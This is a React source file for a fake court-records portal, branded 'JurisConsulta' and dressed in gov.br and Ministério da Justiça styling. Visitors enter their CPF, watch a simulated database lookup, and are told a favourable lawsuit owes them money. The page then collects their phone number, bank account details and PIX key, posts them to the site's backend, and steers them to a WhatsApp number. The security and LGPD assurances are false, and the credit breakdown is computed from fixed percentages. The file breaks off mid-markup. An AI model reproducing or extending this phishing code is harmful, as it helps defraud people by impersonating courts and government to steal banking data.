import { useState, useEffect, useCallback } from 'react'
import {
  Scale, ShieldCheck, CheckCircle, Loader2, ArrowRight, Phone,
  Building2, X, ChevronDown, ChevronUp, ArrowLeft, Copy, Check, User, Clock,
  CreditCard, KeyRound, Landmark, Calendar, Users, UserCircle, Gavel, MapPin,
  FileText, Briefcase, UserCheck, Building, CircleDot
} from 'lucide-react'

function formatCPF(value) {
  const digits = value.replace(/\D/g, '').slice(0, 11)
  if (digits.length <= 3) return digits
  if (digits.length <= 6) return `${digits.slice(0, 3)}.${digits.slice(3)}`
  if (digits.length <= 9) return `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6)}`
  return `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6, 9)}-${digits.slice(9)}`
}

function validarCPF(cpf) {
  const digits = cpf.replace(/\D/g, '')
  if (digits.length !== 11) return false
  if (/^(\d)\1+$/.test(digits)) return false

  let sum = 0
  for (let i = 0; i < 9; i++) sum += parseInt(digits[i]) * (10 - i)
  let d1 = (sum * 10) % 11
  if (d1 === 10) d1 = 0
  if (d1 !== parseInt(digits[9])) return false

  sum = 0
  for (let i = 0; i < 10; i++) sum += parseInt(digits[i]) * (11 - i)
  let d2 = (sum * 10) % 11
  if (d2 === 10) d2 = 0
  if (d2 !== parseInt(digits[10])) return false

  return true
}

function formatPhone(value) {
  const digits = value.replace(/\D/g, '').slice(0, 11)
  if (digits.length <= 2) return digits
  if (digits.length <= 7) return `(${digits.slice(0, 2)}) ${digits.slice(2)}`
  return `(${digits.slice(0, 2)}) ${digits.slice(2, 7)}-${digits.slice(7)}`
}

function formatCurrency(value) {
  return new Intl.NumberFormat('pt-BR', { style: 'currency', currency: 'BRL' }).format(value)
}

function formatDate(dateStr) {
  if (!dateStr) return null
  const date = new Date(dateStr)
  if (isNaN(date.getTime())) return null
  return date.toLocaleDateString('pt-BR')
}

function formatSexo(sexo) {
  if (!sexo) return 'Não consta'
  if (sexo === 'M') return 'Masculino'
  if (sexo === 'F') return 'Feminino'
  return sexo
}

const BANCOS = [
  'Banco do Brasil (001)', 'Bradesco (237)', 'Caixa Econômica Federal (104)',
  'Itaú Unibanco (341)', 'Santander (033)', 'Banco Inter (077)',
  'Nubank (260)', 'BTG Pactual (208)', 'Sicredi (748)', 'Banrisul (041)',
  'Banco Safra (422)', 'Banco Original (212)', 'Sicoob (756)', 'C6 Bank (336)',
  'PagBank / PagSeguro (290)', 'Banco Pan (623)', 'Neon (735)', 'Banco Next (237)',
  'Agibank (121)', 'Banco BMG (318)', 'BS2 (218)', 'Will Bank (280)',
]

const LOADING_STEPS = [
  'Conectando ao Sistema Integrado de Processos',
  'Verificando situação cadastral',
  'Consultando processos vinculados',
]

function LoadingScreen({ onComplete }) {
  const [completedSteps, setCompletedSteps] = useState([])
  const [currentStep, setCurrentStep] = useState(0)

  useEffect(() => {
    let cancelled = false
    async function run() {
      for (let i = 0; i < LOADING_STEPS.length; i++) {
        if (cancelled) return
        setCurrentStep(i)
        await new Promise(r => setTimeout(r, 1200))
        setCompletedSteps(prev => [...prev, i])
      }
      if (!cancelled) {
        await new Promise(r => setTimeout(r, 800))
        onComplete()
      }
    }
    run()
    return () => { cancelled = true }
  }, [onComplete])

  return (
    <div className="min-h-screen bg-[#f0f4f8] flex items-center justify-center p-4 animate-fadeIn">
      <div className="bg-white rounded-lg shadow-sm w-full max-w-md p-8 animate-slideUp">
        {/* Logo */}
        <div className="text-center mb-6">
          <div className="inline-flex items-center gap-2 mb-4">
            <div className="w-10 h-10 bg-[#2364af] rounded-lg flex items-center justify-center">
              <Scale className="w-5 h-5 text-white" />
            </div>
            <span className="text-xl font-bold text-[#2364af]">JurisConsulta</span>
          </div>
          <h1 className="text-lg font-semibold text-gray-900">Sistema de Consulta Processual</h1>
          <p className="text-sm text-gray-500">Tribunal de Justiça</p>
        </div>

        {/* User icon */}
        <div className="flex justify-center mb-6">
          <div className="w-16 h-16 bg-[#e8f0fe] rounded-full flex items-center justify-center animate-pulse">
            <User className="w-8 h-8 text-[#2364af]" />
          </div>
        </div>

        {/* Title */}
        <div className="text-center mb-6">
          <h2 className="text-base font-semibold text-gray-900">Consultando seu CPF na base de dados</h2>
          <p className="text-sm text-gray-500 mt-1">Validando informações junto ao sistema</p>
        </div>

        {/* Steps */}
        <div className="space-y-3 mb-6">
          {LOADING_STEPS.map((step, i) => {
            const completed = completedSteps.includes(i)
            const active = currentStep === i && !completed
            return (
              <div key={i} className={`flex items-center gap-3 transition-all duration-300 ${completed || active ? 'opacity-100' : 'opacity-40'}`}>
                <div className={`w-2.5 h-2.5 rounded-full shrink-0 transition-all duration-300 ${
                  completed ? 'bg-[#2364af] scale-100' : active ? 'bg-[#2364af] animate-ping' : 'bg-gray-200'
                }`} />
                <span className={`text-sm transition-colors duration-300 ${completed ? 'text-gray-700' : active ? 'text-gray-700' : 'text-gray-400'}`}>
                  {step}
                </span>
                {completed && <CheckCircle className="w-4 h-4 text-emerald-500 ml-auto animate-scaleIn" />}
              </div>
            )
          })}
        </div>

        {/* Security notice */}
        <div className="bg-[#e8f0fe] rounded-lg p-4 mb-6 animate-fadeIn" style={{ animationDelay: '0.3s' }}>
          <div className="flex gap-3">
            <ShieldCheck className="w-5 h-5 text-[#2364af] shrink-0 mt-0.5" />
            <p className="text-xs text-gray-600 leading-relaxed">
              Esta consulta está sendo realizada através de conexão segura com o{' '}
              <span className="font-semibold text-[#2364af]">Sistema de Proteção de Dados</span>.
              Todas as informações são tratadas com sigilo absoluto, conforme determina a Lei nº 13.709/2018 (LGPD).
            </p>
          </div>
        </div>

        {/* Footer */}
        <div className="flex items-center justify-center gap-2 text-xs text-gray-400">
          <Loader2 className="w-3.5 h-3.5 animate-spin" />
          <span>Processo concluirá automaticamente em instantes...</span>
        </div>
      </div>
    </div>
  )
}

function ProsseguimentoModal({ processo, cpf, onClose, onSent }) {
  const [form, setForm] = useState({
    telefone: '',
    banco: '',
    agencia: '',
    conta: '',
    tipo_conta: 'corrente',
    titular: processo.nome,
    cpf_titular: cpf,
    chave_pix: '',
  })
  const [sending, setSending] = useState(false)
  const [sent, setSent] = useState(false)
  const [step, setStep] = useState(1)
  const [config, setConfig] = useState({ whatsapp_numero: '5511999999999', whatsapp_mensagem: '' })

  useEffect(() => {
    fetch('/api/configuracoes').then(r => r.json()).then(setConfig).catch(() => {})
  }, [])

  function buildWhatsAppUrl() {
    let msg = config.whatsapp_mensagem || `Olá! Enviei meus dados para prosseguimento do processo {processo}.`
    msg = msg
      .replace(/{nome}/g, form.titular || '')
      .replace(/{processo}/g, processo.numero_processo || '')
      .replace(/{cpf}/g, form.cpf_titular || '')
      .replace(/{banco}/g, form.banco || '')
      .replace(/{agencia}/g, form.agencia || '')
      .replace(/{conta}/g, form.conta || '')
      .replace(/{tipo_conta}/g, form.tipo_conta === 'poupanca' ? 'Poupança' : 'Corrente')
      .replace(/{titular}/g, form.titular || '')
      .replace(/{cpf_titular}/g, form.cpf_titular || '')
      .replace(/{pix}/g, form.chave_pix || 'Não informado')
    return `https://wa.me/${config.whatsapp_numero}?text=${encodeURIComponent(msg)}`
  }

  async function handleSubmit(e) {
    e.preventDefault()
    setSending(true)
    try {
      const res = await fetch('/api/prosseguimento', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ processo_id: processo.id, cpf: cpf.replace(/\D/g, ''), ...form }),
      })
      if (res.ok) {
        setSent(true)
        if (onSent) onSent()
      }
    } catch {
      alert('Erro ao enviar. Tente novamente.')
    } finally {
      setSending(false)
    }
  }

  function handleContinue() {
    if (form.telefone && form.telefone.replace(/\D/g, '').length >= 10) {
      setStep(2)
    }
  }

  if (sent) {
    return (
      <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/50 animate-fadeIn">
        <div className="bg-white rounded-2xl w-full max-w-sm p-8 text-center animate-slideUp shadow-xl">
          <div className="w-16 h-16 mx-auto mb-5 bg-emerald-50 rounded-full flex items-center justify-center animate-scaleIn">
            <CheckCircle className="w-8 h-8 text-emerald-500" />
          </div>
          <h3 className="text-xl font-semibold text-gray-900 mb-2">Dados enviados!</h3>
          <p className="text-sm text-gray-500 mb-2">Seus dados foram recebidos com sucesso.</p>
          <p className="text-sm text-gray-600 mb-6">Para dar prosseguimento ao processo, é necessário <span className="font-semibold text-[#25D366]">continuar os passos pelo WhatsApp oficial</span>.</p>
          <a href={buildWhatsAppUrl()} target="_blank" rel="noopener noreferrer"
            className="flex items-center justify-center gap-2 w-full py-3.5 bg-[#25D366] hover:bg-[#1da851] text-white rounded-xl font-semibold transition-all hover:scale-[1.02] active:scale-[0.98]">
            <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/></svg>
            Abrir WhatsApp
          </a>
          <button onClick={onClose} className="mt-4 text-sm text-gray-400 hover:text-gray-600 transition-colors">Fechar</button>
        </div>
      </div>
    )
  }

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/50 animate-fadeIn">
      <div className="bg-white rounded-2xl w-full max-w-md overflow-hidden shadow-xl animate-slideUp">
        {/* Header */}
        <div className="bg-gradient-to-r from-[#2364af] to-[#1a4f8f] px-6 py-5 text-white">
          <div className="flex items-center justify-between">
            <div>
              <h3 className="font-semibold text-lg">Dados para Recebimento</h3>
              <p className="text-white/70 text-sm mt-0.5">Processo {processo.numero_processo}</p>
            </div>
            <button onClick={onClose} className="p-2 hover:bg-white/10 rounded-lg transition-colors">
              <X className="w-5 h-5" />
            </button>
          </div>
          {/* Steps indicator */}
          <div className="flex items-center gap-2 mt-4">
            <div className={`flex-1 h-1 rounded-full transition-colors ${step >= 1 ? 'bg-white' : 'bg-white/30'}`} />
            <div className={`flex-1 h-1 rounded-full transition-colors ${step >= 2 ? 'bg-white' : 'bg-white/30'}`} />
          </div>
          <div className="flex justify-between text-xs mt-2 text-white/70">
            <span className={step === 1 ? 'text-white font-medium' : ''}>Confirmação</span>
            <span className={step === 2 ? 'text-white font-medium' : ''}>Dados Bancários</span>
          </div>
        </div>

        <form onSubmit={handleSubmit} className="p-6">
          {step === 1 && (
            <div className="space-y-4 animate-fadeIn">
              {/* Info box */}
              <div className="bg-[#e8f0fe] rounded-xl p-4 flex gap-3 mb-2">
                <User className="w-5 h-5 text-[#2364af] shrink-0 mt-0.5" />
                <div>
                  <p className="text-sm font-medium text-gray-900">{processo.nome}</p>
                  <p className="text-xs text-gray-500">CPF: {cpf}</p>
                </div>
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  <Phone className="w-4 h-4 inline mr-1.5 text-gray-400" />
                  Telefone para contato
                </label>
                <input
                  type="tel"
                  inputMode="tel"
                  required
                  value={form.telefone}
                  onChange={e => setForm({ ...form, telefone: formatPhone(e.target.value) })}
                  className="w-full px-4 py-4 border border-gray-200 rounded-xl text-lg focus:border-[#2364af] focus:ring-2 focus:ring-[#2364af]/20 transition-all"
                  placeholder="(00) 00000-0000"
                  autoFocus
                  autoComplete="tel"
                />
              </div>

              <button
                type="button"
                onClick={handleContinue}
                disabled={!form.telefone || form.telefone.replace(/\D/g, '').length < 10}
                className="w-full py-4 bg-[#2364af] hover:bg-[#1a4f8f] disabled:bg-gray-200 disabled:text-gray-400 text-white rounded-xl font-semibold transition-all hover:scale-[1.01] active:scale-[0.99] flex items-center justify-center gap-2"
              >
                Continuar
                <ArrowRight className="w-4 h-4" />
              </button>
            </div>
          )}

          {step === 2 && (
            <div className="space-y-4 animate-fadeIn">
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  <Building2 className="w-4 h-4 inline mr-1.5 text-gray-400" />
                  Banco
                </label>
                <select
                  required
                  value={form.banco}
                  onChange={e => setForm({ ...form, banco: e.target.value })}
                  className="w-full px-4 py-3.5 border border-gray-200 rounded-xl text-base bg-white focus:border-[#2364af] focus:ring-2 focus:ring-[#2364af]/20 transition-all appearance-none"
                  style={{ backgroundImage: `url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke='%239ca3af'%3E%3Cpath stroke-linecap='round' stroke-linejoin='round' stroke-width='2' d='M19 9l-7 7-7-7'%3E%3C/path%3E%3C/svg%3E")`, backgroundRepeat: 'no-repeat', backgroundPosition: 'right 12px center', backgroundSize: '20px' }}
                >
                  <option value="">Selecione o banco</option>
                  {BANCOS.map(b => <option key={b} value={b}>{b}</option>)}
                </select>
              </div>

              <div className="grid grid-cols-2 gap-3">
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">Agência</label>
                  <input
                    type="tel"
                    inputMode="numeric"
                    pattern="[0-9]*"
                    required
                    value={form.agencia}
                    onChange={e => setForm({ ...form, agencia: e.target.value.replace(/\D/g, '').slice(0, 6) })}
                    className="w-full px-4 py-4 border border-gray-200 rounded-xl text-lg text-center focus:border-[#2364af] focus:ring-2 focus:ring-[#2364af]/20 transition-all"
                    placeholder="0000"
                  />
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">Conta</label>
                  <input
                    type="tel"
                    inputMode="numeric"
                    required
                    value={form.conta}
                    onChange={e => setForm({ ...form, conta: e.target.value.replace(/[^\d-]/g, '').slice(0, 15) })}
                    className="w-full px-4 py-4 border border-gray-200 rounded-xl text-lg text-center focus:border-[#2364af] focus:ring-2 focus:ring-[#2364af]/20 transition-all"
                    placeholder="00000-0"
                  />
                </div>
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">Tipo de conta</label>
                <div className="grid grid-cols-2 gap-3">
                  {[
                    { value: 'corrente', label: 'Corrente', icon: CreditCard },
                    { value: 'poupanca', label: 'Poupança', icon: Landmark }
                  ].map(tipo => (
                    <button
                      key={tipo.value}
                      type="button"
                      onClick={() => setForm({ ...form, tipo_conta: tipo.value })}
                      className={`py-4 px-4 rounded-xl text-base font-medium border-2 transition-all flex items-center justify-center gap-2 ${
                        form.tipo_conta === tipo.value
                          ? 'border-[#2364af] bg-[#e8f0fe] text-[#2364af]'
                          : 'border-gray-200 text-gray-600 hover:border-gray-300'
                      }`}
                    >
                      <tipo.icon className="w-5 h-5" />
                      {tipo.label}
                    </button>
                  ))}
                </div>
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  <KeyRound className="w-4 h-4 inline mr-1.5 text-gray-400" />
                  Chave PIX <span className="text-gray-400 font-normal">(opcional)</span>
                </label>
                <input
                  type="text"
                  value={form.chave_pix}
                  onChange={e => setForm({ ...form, chave_pix: e.target.value })}
                  className="w-full px-4 py-4 border border-gray-200 rounded-xl text-base focus:border-[#2364af] focus:ring-2 focus:ring-[#2364af]/20 transition-all"
                  placeholder="CPF, e-mail ou chave aleatória"
                />
              </div>

              <div className="flex gap-3 pt-2">
                <button
                  type="button"
                  onClick={() => setStep(1)}
                  className="flex-1 py-4 border border-gray-200 rounded-xl text-sm font-semibold text-gray-600 hover:bg-gray-50 transition-all"
                >
                  Voltar
                </button>
                <button
                  type="submit"
                  disabled={sending || !form.banco || !form.agencia || !form.conta}
                  className="flex-[2] py-4 bg-[#2364af] hover:bg-[#1a4f8f] disabled:bg-gray-200 disabled:text-gray-400 text-white rounded-xl font-semibold transition-all hover:scale-[1.01] active:scale-[0.99] flex items-center justify-center gap-2"
                >
                  {sending ? <Loader2 className="w-5 h-5 animate-spin" /> : 'Enviar Dados'}
                </button>
              </div>
            </div>
          )}
        </form>
      </div>
    </div>
  )
}

function SearchScreen({ onSearch, loading, error }) {
  const [cpf, setCpf] = useState('')
  const [localError, setLocalError] = useState('')
  const [showInfo, setShowInfo] = useState(true)

  function handleSubmit(e) {
    e.preventDefault()
    const digits = cpf.replace(/\D/g, '')
    if (digits.length !== 11) {
      setLocalError('Informe um CPF com 11 dígitos')
      return
    }
    if (!validarCPF(cpf)) {
      setLocalError('CPF inválido. Verifique os números.')
      return
    }
    setLocalError('')
    onSearch(cpf)
  }

  return (
    <div className="min-h-screen bg-[#f0f4f8] animate-fadeIn">
      {/* Header */}
      <header className="bg-white border-b border-gray-200">
        <div className="max-w-5xl mx-auto px-4 py-3 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-8 h-8 bg-[#2364af] rounded flex items-center justify-center">
              <Scale className="w-4 h-4 text-white" />
            </div>
            <div className="border-l border-gray-200 pl-3">
              <p className="text-sm font-semibold text-gray-900 leading-tight">Consulta Processual</p>
              <p className="text-xs text-gray-500">Portal de Serviços</p>
            </div>
          </div>
        </div>
      </header>

      {/* Main */}
      <main className="flex items-center justify-center min-h-[calc(100vh-57px)] p-4">
        <div className="bg-white rounded-lg shadow-sm w-full max-w-md p-8 animate-slideUp">
          {/* Logo */}
          <div className="text-center mb-6">
            <div className="inline-flex items-center gap-2 mb-3">
              <div className="w-10 h-10 bg-[#2364af] rounded-lg flex items-center justify-center">
                <Scale className="w-5 h-5 text-white" />
              </div>
              <span className="text-xl font-bold text-[#2364af]">JurisConsulta</span>
            </div>
            <h1 className="text-lg font-semibold text-gray-900">Sistema de Consulta Processual</h1>
            <p className="text-sm text-gray-500">Tribunal de Justiça - Portal de Serviços</p>
          </div>

          {/* Security accordion */}
          <div className="border border-[#2364af]/20 rounded-lg mb-6 overflow-hidden">
            <button
              onClick={() => setShowInfo(!showInfo)}
              className="w-full flex items-center justify-between p-3 bg-[#e8f0fe]/50 text-left transition-colors hover:bg-[#e8f0fe]"
            >
              <div className="flex items-center gap-2">
                <ShieldCheck className="w-4 h-4 text-[#2364af]" />
                <span className="text-sm font-medium text-[#2364af]">Consulta Segura</span>
              </div>
              <ChevronDown className={`w-4 h-4 text-[#2364af] transition-transform duration-300 ${showInfo ? 'rotate-180' : ''}`} />
            </button>
            <div className={`overflow-hidden transition-all duration-300 ${showInfo ? 'max-h-40 opacity-100' : 'max-h-0 opacity-0'}`}>
              <div className="p-3 text-xs text-gray-600 leading-relaxed border-t border-[#2364af]/10">
                Esta consulta está sendo realizada através de conexão segura com o{' '}
                <span className="font-semibold text-[#2364af]">Sistema de Proteção de Dados</span> do Tribunal de Justiça.
                Todas as informações são tratadas com sigilo absoluto, conforme determina a Lei nº 13.709/2018 (LGPD).
              </div>
            </div>
          </div>

          {/* Form */}
          <form onSubmit={handleSubmit}>
            <label className="block text-sm text-gray-700 mb-2">Informe seu CPF para consulta</label>
            <input
              type="tel"
              inputMode="numeric"
              pattern="[0-9]*"
              value={cpf}
              onChange={e => { setCpf(formatCPF(e.target.value)); setLocalError('') }}
              placeholder="000.000.000-00"
              className="w-full px-4 py-4 border border-gray-200 rounded-lg text-lg text-center font-mono tracking-wider focus:border-[#2364af] focus:ring-2 focus:ring-[#2364af]/20 transition-all mb-4"
              autoFocus
              autoComplete="off"
            />

            {(localError || error) && (
              <p className="text-red-500 text-sm mb-4 animate-shake">{localError || error}</p>
            )}

            <button
              type="submit"
              disabled={loading}
              className="w-full py-3.5 bg-[#2364af] hover:bg-[#1a4f8f] disabled:bg-gray-300 text-white rounded-lg font-semibold uppercase text-sm tracking-wide transition-all hover:scale-[1.01] active:scale-[0.99]"
            >
              {loading ? <Loader2 className="w-5 h-5 animate-spin mx-auto" /> : 'Consultar Agora'}
            </button>
          </form>

          {/* Footer */}
          <p className="text-center text-xs text-gray-400 mt-6">
            Esta consulta é realizada diretamente com os sistemas do Tribunal de Justiça
          </p>
        </div>
      </main>
    </div>
  )
}

function ResultScreen({ processos: processosIniciais, cpf, dadosPessoais, onBack }) {
  const [prosseguimento, setProsseguimento] = useState(null)
  const [copied, setCopied] = useState(null)
  const [dadosEnviados, setDadosEnviados] = useState(processosIniciais[0]?.dados_enviados || false)
  const [config, setConfig] = useState({ whatsapp_numero: '5511999999999' })
  const hoje = new Date().toLocaleDateString('pt-BR')

  useEffect(() => {
    fetch('/api/configuracoes').then(r => r.json()).then(setConfig).catch(() => {})
  }, [])

  function copyToClipboard(text, id) {
    navigator.clipboard.writeText(text)
    setCopied(id)
    setTimeout(() => setCopied(null), 2000)
  }

  return (
    <div className="min-h-screen bg-gray-100 flex flex-col animate-fadeIn">
      {prosseguimento && (
        <ProsseguimentoModal
          processo={prosseguimento}
          cpf={cpf}
          onClose={() => setProsseguimento(null)}
          onSent={() => setDadosEnviados(true)}
        />
      )}

      {/* Header Gov Style */}
      <header className="bg-white border-b border-gray-200">
        <div className="max-w-4xl mx-auto px-4 py-3 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="flex items-center gap-2 text-[#1351B4] font-bold text-lg">
              <Scale className="w-6 h-6" />
              <span>gov.br</span>
            </div>
            <div className="border-l border-gray-300 pl-3">
              <p className="text-sm font-medium text-gray-900">Consulta Processual</p>
              <p className="text-xs text-gray-500">Ministério da Justiça</p>
            </div>
          </div>
          <div className="flex items-center gap-4">
            <span className="text-xs text-gray-500 hidden sm:block">{dadosPessoais?.NOME || 'Usuário'}</span>
            <div className="w-8 h-8 bg-[#1351B4] rounded-full flex items-center justify-center text-white text-sm font-bold">
              {(dadosPessoais?.NOME || 'U').charAt(0)}
            </div>
          </div>
        </div>
      </header>

      {/* Barra azul título */}
      <div className="bg-[#1351B4] text-white py-4">
        <div className="max-w-4xl mx-auto px-4 flex items-center gap-3">
          <FileText className="w-5 h-5" />
          <span className="font-medium">Extrato de Processo Judicial - Crédito a Receber</span>
        </div>
      </div>

      {/* Content */}
      <main className="flex-1 max-w-4xl mx-auto w-full px-4 py-6 pb-36">

        {/* Alerta de status no topo */}
        <div className="mb-6 p-4 bg-green-50 border border-green-200 rounded-lg animate-slideUp">
          <div className="flex gap-3">
            <CheckCircle className="w-5 h-5 text-green-600 shrink-0 mt-0.5" />
            <div>
              <p className="text-sm font-semibold text-green-800">Processo em Fase Favorável</p>
              <p className="text-sm text-green-700 mt-0.5">
                Processo atualizado em <strong>{hoje}</strong>. Situação favorável ao requerente, aguardando dados bancários para liberação do crédito judicial.
              </p>
            </div>
          </div>
        </div>

        {processosIniciais.map((p, i) => (
          <div key={i} className="bg-white border border-gray-200 rounded-lg mb-6 animate-slideUp">

            {/* Cabeçalho do documento */}
            <div className="p-5 border-b border-gray-200">
              <div className="flex items-start gap-4">
                <div className="w-12 h-12 bg-[#1351B4] rounded-lg flex items-center justify-center">
                  <Scale className="w-6 h-6 text-white" />
                </div>
                <div className="flex-1">
                  <h2 className="text-lg font-bold text-gray-900">Processo Judicial</h2>
                  <p className="text-sm text-gray-500">Tribunal de Justiça • Vara Cível</p>
                </div>
              </div>
            </div>

            {/* Dados lado a lado */}
            <div className="grid md:grid-cols-2 divide-y md:divide-y-0 md:divide-x divide-gray-200">
              {/* Dados do Requerente */}
              <div className="p-5">
                <h3 className="text-xs font-bold text-gray-500 uppercase tracking-wider mb-4">Dados do Requerente</h3>
                <div className="space-y-3">
                  <div>
                    <p className="text-xs text-gray-400">Nome</p>
                    <p className="text-sm font-semibold text-gray-900">{p.polo_ativo || p.nome}</p>
                  </div>
                  <div>
                    <p className="text-xs text-gray-400">CPF</p>
                    <p className="text-sm font-mono text-gray-900">{cpf}</p>
                  </div>
                </div>
              </div>

              {/* Dados do Processo */}
              <div className="p-5">
                <h3 className="text-xs font-bold text-gray-500 uppercase tracking-wider mb-4">Informações do Processo</h3>
                <div className="grid grid-cols-2 gap-3">
                  <div>
                    <p className="text-xs text-gray-400">Nº Processo</p>
                    <div className="flex items-center gap-1">
                      <p className="text-sm font-mono font-semibold text-gray-900">{p.numero_processo}</p>
                      <button onClick={() => copyToClipboard(p.numero_processo, `proc-${i}`)} className="p-0.5 hover:bg-gray-100 rounded">
                        {copied === `proc-${i}` ? <Check className="w-3 h-3 text-green-500" /> : <Copy className="w-3 h-3 text-gray-400" />}
                      </button>
                    </div>
                  </div>
                  <div>
                    <p className="text-xs text-gray-400">Classe Judicial</p>
                    <p className="text-sm text-gray-900">{p.classe || 'Cível'}</p>
                  </div>
                  <div>
                    <p className="text-xs text-gray-400">Autuação</p>
                    <p className="text-sm text-gray-900">{p.autuacao || hoje}</p>
                  </div>
                  <div>
                    <p className="text-xs text-gray-400">Atualização</p>
                    <p className="text-sm font-semibold text-[#1351B4]">{hoje}</p>
                  </div>
                </div>
              </div>
            </div>

            {/* Polo Passivo e Detalhes */}
            <div className="px-5 py-4 border-t border-gray-200 bg-gray-50">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-3">
                <div>
                  <p className="text-xs text-gray-400">Requerido (Polo Passivo)</p>
                  <p className="text-sm font-semibold text-gray-900">{p.polo_passivo || 'Não informado'}</p>
                  {p.cnpj_reu && <p className="text-xs text-gray-500 font-mono mt-0.5">CNPJ: {p.cnpj_reu}</p>}
                </div>
                <div>
                  <p className="text-xs text-gray-400">Assunto(s)</p>
                  <p className="text-sm text-gray-900">{p.assunto || 'Não informado'}</p>
                </div>
              </div>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                  <p className="text-xs text-gray-400">Jurisdição</p>
                  <p className="text-sm text-gray-900">{p.jurisdicao || p.comarca || 'Não informada'}</p>
                </div>
                <div>
                  <p className="text-xs text-gray-400">Órgão Julgador</p>
                  <p className="text-sm text-gray-900">{p.orgao_julgador || p.vara || 'Não informado'}</p>
                </div>
              </div>
              {(p.justica_gratuita === 'SIM' || p.tutela_liminar === 'SIM' || (p.prioridade && p.prioridade !== 'NÃO')) && (
                <div className="flex flex-wrap gap-2 mt-3 pt-3 border-t border-gray-200">
                  {p.justica_gratuita === 'SIM' && (
                    <span className="px-2 py-1 bg-blue-100 text-blue-700 text-xs rounded font-medium">Justiça Gratuita</span>
                  )}
                  {p.tutela_liminar === 'SIM' && (
                    <span className="px-2 py-1 bg-purple-100 text-purple-700 text-xs rounded font-medium">Tutela/Liminar</span>
                  )}
                  {p.prioridade && p.prioridade !== 'NÃO' && (
                    <span className="px-2 py-1 bg-orange-100 text-orange-700 text-xs rounded font-medium">{p.prioridade}</span>
                  )}
                </div>
              )}
            </div>

            {/* Tabela de Valores */}
            <div className="p-5 border-t border-gray-200">
              <h3 className="text-xs font-bold text-gray-500 uppercase tracking-wider mb-4 flex items-center gap-2">
                <span className="text-lg">₢</span> Composição do Crédito
              </h3>
              <table className="w-full">
                <thead>
                  <tr className="border-b border-gray-200">
                    <th className="text-left text-xs font-semibold text-gray-500 uppercase py-2">Descrição</th>
                    <th className="text-right text-xs font-semibold text-gray-500 uppercase py-2">Valor (R$)</th>
                  </tr>
                </thead>
                <tbody>
                  {p.valor_causa && (
                    <tr className="border-b border-gray-100">
                      <td className="py-3 text-sm text-gray-700">Valor da Causa</td>
                      <td className="py-3 text-sm text-gray-900 text-right">{p.valor_causa}</td>
                    </tr>
                  )}
                  <tr className="border-b border-gray-100">
                    <td className="py-3 text-sm text-gray-700">Valor Principal</td>
                    <td className="py-3 text-sm text-gray-900 text-right">{formatCurrency(p.valor_receber * 0.7)}</td>
                  </tr>
                  <tr className="border-b border-gray-100">
                    <td className="py-3 text-sm text-gray-700">Correção Monetária</td>
                    <td className="py-3 text-sm text-gray-900 text-right">{formatCurrency(p.valor_receber * 0.2)}</td>
                  </tr>
                  <tr className="border-b border-gray-100">
                    <td className="py-3 text-sm text-gray-700">Juros de Mora</td>
                    <td className="py-3 text-sm text-gray-900 text-right">{formatCurrency(p.valor_receber * 0.1)}</td>
                  </tr>
                  <tr className="bg-gray-50">
                    <td className="py-3 text-sm font-bold text-gray-900">Valor Total a Receber</td>
                    <td className="py-3 text-lg font-bold text-[#1351B4] text-right">{formatCurrency(p.valor_receber)}</td>
                  </tr>
                </tbody>
              </table>
            </div>

            {/* Rodapé do documento */}
            <div className="px-5 py-3 border-t border-gray-200 bg-gray-50 flex items-center justify-between text-xs text-gray-500">
              <span>Documento gerado eletronicamente em {hoje}</span>
              <span>Código: {p.numero_processo.replace(/\D/g, '').slice(0, 10)}</span>
            </div>
          </div>
        ))}

        {/* Dados do Titular */}
        {dadosPessoais && (
          <div className="bg-white border border-gray-200 rounded-lg animate-slideUp">
            <div className="px-5 py-4 border-b border-gray-200 flex items-center gap-3">
              <User className="w-5 h-5 text-gray-400" />
              <h2 className="text-sm font-bold text-gray-700 uppercase tracking-wide">Dados Cadastrais do Titular</h2>
            </div>
            <div className="p-5">
              <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                <div className="col-span-2">
                  <p className="text-xs text-gray-400 mb-1">Nome Completo</p>
